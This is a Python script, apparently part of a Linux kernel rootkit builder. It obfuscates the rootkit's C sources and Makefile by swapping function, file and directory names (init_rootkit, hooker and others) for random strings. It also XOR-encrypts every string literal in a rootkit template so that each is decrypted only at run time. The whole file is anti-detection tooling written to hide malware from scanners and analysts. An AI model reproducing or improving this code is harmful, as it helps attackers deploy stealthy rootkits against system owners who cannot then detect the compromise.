#!/usr/bin/env python3

import os
import re
import random
import string
import secrets


class FilesAndFunctions:

    def __init__(self):
        self.var_map = {}
        self.file_map = {}
        self.path_map = {}

        self.header_regex = re.compile("^[^/].* [ *(-]*(?P<var>[a-zA-Z0-9_]+)[ *)-]*(\(|{)+.*")

        self.var_map["init_rootkit"] = self.random_string()
        self.var_map["runner"] = self.random_string()
        self.var_map["clear_rootkit"] = self.random_string()
        self.var_map["rootkit_example_init"] = self.random_string()
        self.var_map["rootkit_example_exit"] = self.random_string()
        self.var_map["rootkit"] = self.random_string()

        self.file_map["project.c"] = self.random_string()

        self.path_map["rootkit"] = self.random_string()
        self.path_map["hooker"] = self.random_string()
        self.path_map["mods"] = self.random_string()

    def start(self):
        os.mkdir(self.path_map["rootkit"])

        headers = []
        sources = []

        for root, dirs, files in os.walk("rootkit", topdown=False):
            for name in files:
                if name.endswith(".h"):
                    headers.append(os.path.join(root, name))
                else:
                    sources.append(os.path.join(root, name))

            for dire in dirs:
                path = root+"/"+dire
                for key, value in self.path_map.items():
                    path = re.sub(key, value, path)
                if not os.path.isdir(path):
                    os.makedirs(path)

        for h in headers:
            self.obfuscate(h, True)

        for s in sources:
            self.obfuscate(s)

        self.obfuscate("Makefile")

        os.system("mv Makefile Makefile_old")
        os.system("mv Makefile_new Makefile")

    def get_name(self):
        return self.file_map["project.c"]

    def random_string(self):
        ret = random.SystemRandom().choice(string.ascii_letters)
        ret += ''.join(random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(15))
        return ret


    def obfuscate(self, file, header=False):
        new_file_content = ""

        with open(file, "r") as f:
            data = f.readlines()

        path = file.split('/')
        file_base = '/'.join(path[:-1])
        for key, value in self.path_map.items():
            file_base = re.sub(key, value, file_base)

        new_file = re.sub(r'.*(\.[ch])', self.random_string()+r'\1', path[-1])
        self.file_map[path[-1]] = new_file


        for line in data:
            if file == "rootkit/core.h":
                new_file_content += line
                continue

            if header:
                match = self.header_regex.match(line)
                if match:
                    var = match.groupdict()["var"]
                    self.var_map[var] = self.random_string()

            if not line.lstrip().startswith("#include") and not line.lstrip().startswith("#pragma") and file != "Makefile":
                for key, value in self.var_map.items():
                    if re.match(r'(.*[^a-zA-Z0-9]|^)'+key+r'([^a-zA-Z0-9]).*', line):
                        line = re.sub(r'([^a-zA-Z0-9]|^)'+key+r'([^a-zA-Z0-9])', r'\1'+value+r'\2', line)

            if line.lstrip().startswith("#") or file == "Makefile":
                for key, value in self.file_map.items():
                    if file == "Makefile":
                        if key.endswith(".c"):
                            key = key.split(".")[0]
                            value = value.split(".")[0]
                        else:
                            continue

                    if re.match(r'(.*[^a-zA-Z0-9]|^)'+key+r'([^a-zA-Z0-9]).*', line):
                        for key2, value2 in self.path_map.items():
                            line = re.sub(key2, value2, line)
                        line = re.sub(r'([^a-zA-Z0-9]|^)'+key+r'([^a-zA-Z0-9])', r'\1'+value+r'\2', line)


            new_file_content += line

        if file == "Makefile":
            with open("Makefile_new", 'w') as f:
                f.write(new_file_content)

        else:
            with open(file_base+"/"+new_file, 'w') as f:
                f.write(new_file_content)

class Strings:
    def __init__(self):
        self.strings = {}
        self.strings["enc"] = {}
        self.strings["key"] = {}

        with open("rootkit_files/rootkit_template.j2","r") as file:
            for line in file:
                if re.search("^[^#][^/]*\"[^\"]*\"", line) and not re.search("MODULE_", line):
                    data = re.findall("\"([^\"]*)\"", line)
                    for x in data:
                        if not re.search("{{.*}}", x) and x != "":
                            self.strings["enc"][x] = bytearray(x.encode())
                            self.strings["key"][x] = ""

    def setAdditional(self, d):
        self.additional = []
        self.iterData(d)
        for x in self.additional:
            self.strings["enc"][x] = bytearray(x.encode())
            self.strings["key"][x] = ""

    def iterData(self, d):
        if isinstance(d, dict):
            for k,v in d.items():
                if isinstance(v, dict):
                    self.iterData(v)
                elif isinstance(v, list):
                    self.iterData(v)
                elif isinstance(v, str):
                    self.additional.append(v)
        else:
            for v in d:
                if isinstance(v, dict):
                    self.iterData(v)
                elif isinstance(v, list):
                    self.iterData(v)
                elif isinstance(v, str):
                    self.additional.append(v)


    def getStrings(self):
        return self.strings

    def start(self):
        for x in self.strings["enc"]:
            key = secrets.token_bytes(16)
            self.strings["key"][x] = ''.join(['\\x'+hex(c)[2:] for c in key])
            self.strings["enc"][x] = ''.join(['\\x'+hex(c)[2:] for c in bytes(self.xor(self.strings["enc"][x], key))])

    def xor(self, data, key):
        l = len(key)
        return bytearray((
            (data[i] ^ key[i % l]) for i in range(0,len(data))
        ))

    def rewrite(self, data):
        ret = ""
        for line in data.splitlines():
            for k, v in self.strings["enc"].items():
                if k in line:
                    replace = "DECRYPT(\""+re.escape(v)+"\", \""+re.escape(self.strings["key"][k])+"\")"
                    line = re.sub("\""+k+"\"", replace, line)
            ret += line + "\n"
        return ret
